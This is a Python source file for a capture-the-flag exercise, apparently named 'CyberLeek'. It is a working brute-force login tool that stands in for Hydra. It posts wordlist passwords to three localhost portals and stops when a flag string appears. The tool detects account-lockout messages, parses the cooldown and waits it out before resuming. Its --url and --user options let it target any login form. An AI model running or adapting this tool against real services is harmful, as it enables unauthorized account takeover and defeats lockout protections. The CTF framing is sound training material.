# -*- coding: utf-8 -*-
"""
brute_force_test.py
-------------------
Automated Python brute-force tool & Hydra substitute for Round 3 (Evidence 03: The Mirror).
Performs lockout-aware credential testing against Level 1, Level 2, or Level 3 portals.

Usage:
    python brute_force_test.py --level 1
    python brute_force_test.py --level 2
    python brute_force_test.py --level 3
    python brute_force_test.py --url http://127.0.0.1:5000/cdn-mirror/node-alpha-92 --user mirror_admin
"""

import sys
import time
import re
import argparse
import requests

DEFAULT_TARGETS = {
    1: {
        "url": "http://127.0.0.1:5000/cdn-mirror/node-alpha-92",
        "username": "mirror_admin",
        "desc": "Level 1: Abandoned CDN Edge Node",
    },
    2: {
        "url": "http://127.0.0.1:5000/archive-index/shard-vault-88",
        "username": "archive_curator",
        "desc": "Level 2: Fragmented Archive Shard Vault",
    },
    3: {
        "url": "http://127.0.0.1:5000/disinfo-core/core-master-x7",
        "username": "core_overseer",
        "desc": "Level 3: Disinformation Command Core",
    },
}

def parse_wait_seconds(html_body):
    m = re.search(r"(\d+)\s*(?:seconds|s)", html_body, re.IGNORECASE)
    if m:
        return int(m.group(1))
    return 90

def run_brute_force(target_url, username, wordlist_path, delay=0.5):
    print("=" * 65)
    print("  CYBERLEEK CTF // EVIDENCE 03 BRUTE-FORCE ENGINE")
    print("=" * 65)
    print(f"[*] Target Portal : {target_url}")
    print(f"[*] Target User   : {username}")
    print(f"[*] Wordlist Path : {wordlist_path}")
    print(f"[*] Throttle Delay: {delay}s between requests")
    print("-" * 65)

    try:
        with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(f"[x] Failed to load wordlist '{wordlist_path}': {e}")
        return

    print(f"[*] Loaded {len(passwords)} candidate passwords into memory.\n")

    session = requests.Session()
    found_password = None
    found_flag = None

    idx = 0
    total = len(passwords)

    while idx < total:
        pwd = passwords[idx]
        attempt_num = idx + 1

        try:
            resp = session.post(target_url, data={"username": username, "password": pwd}, timeout=10)
            body = resp.text

            if "CYBERLEEK{" in body:
                found_password = pwd
                m = re.search(r"CYBERLEEK\{[^}]+\}", body)
                found_flag = m.group(0) if m else "CYBERLEEK{...}"
                print(f"\n[+] SUCCESS on attempt {attempt_num} / {total}!")
                print(f"    Authenticated Password : {found_password}")
                print(f"    Recovered Evidence Flag: {found_flag}")
                break

            elif "ACCESS LOCKOUT ACTIVE" in body or "Too many failed attempts" in body:
                wait_sec = parse_wait_seconds(body)
                print(f"[!] LOCKOUT TRIGGERED on attempt {attempt_num} for candidate '{pwd}'.")
                print(f"    Server enforced cooldown: waiting {wait_sec + 2}s before retrying...")
                time.sleep(wait_sec + 2)
                continue

            else:
                print(f"[-] Attempt {attempt_num:03d}/{total}: '{pwd}' -> Rejected")
                time.sleep(delay)
                idx += 1

        except requests.exceptions.RequestException as req_err:
            print(f"[!] Network error on attempt {attempt_num}: {req_err}")
            print("    Retrying in 5 seconds...")
            time.sleep(5)
            continue

    print("\n" + "=" * 65)
    if found_password:
        print(f"[✓] BRUTE-FORCE COMPLETE. Password: {found_password}")
        print(f"[✓] FLAG: {found_flag}")
    else:
        print("[x] Wordlist exhausted. No valid credentials recovered.")
    print("=" * 65)

def main():
    parser = argparse.ArgumentParser(description="CyberLeek Evidence 03 Hydra Substitute")
    parser.add_argument("--level", type=int, choices=[1, 2, 3], default=1, help="CTF Level (1, 2, or 3)")
    parser.add_argument("--url", type=str, help="Custom portal URL (overrides --level)")
    parser.add_argument("--user", type=str, help="Custom username (overrides --level)")
    parser.add_argument("--wordlist", type=str, default="wordlists/hydra_passwords.txt", help="Path to password wordlist")
    parser.add_argument("--delay", type=float, default=0.5, help="Delay between attempts in seconds")

    args = parser.parse_args()

    if args.url and args.user:
        target_url = args.url
        target_user = args.user
    else:
        cfg = DEFAULT_TARGETS[args.level]
        target_url = cfg["url"]
        target_user = cfg["username"]
        print(f"[*] Mode: {cfg['desc']}")

    run_brute_force(target_url, target_user, args.wordlist, args.delay)

if __name__ == "__main__":
    main()